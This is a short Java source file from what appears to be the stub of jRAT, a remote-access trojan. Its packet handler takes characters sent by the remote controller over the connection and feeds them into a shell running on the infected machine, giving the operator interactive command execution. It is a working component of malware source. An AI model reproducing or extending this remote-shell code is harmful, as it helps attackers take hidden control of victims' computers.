package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.RemoteShell;

import java.io.PrintWriter;

public class Packet22RemoteShellTyped extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		char c = con.getDataInputStream().readChar();

		PrintWriter input = new PrintWriter(RemoteShell.getInstance().getOutputStream(), true);
		input.print(c);
		input.flush();
	}

}
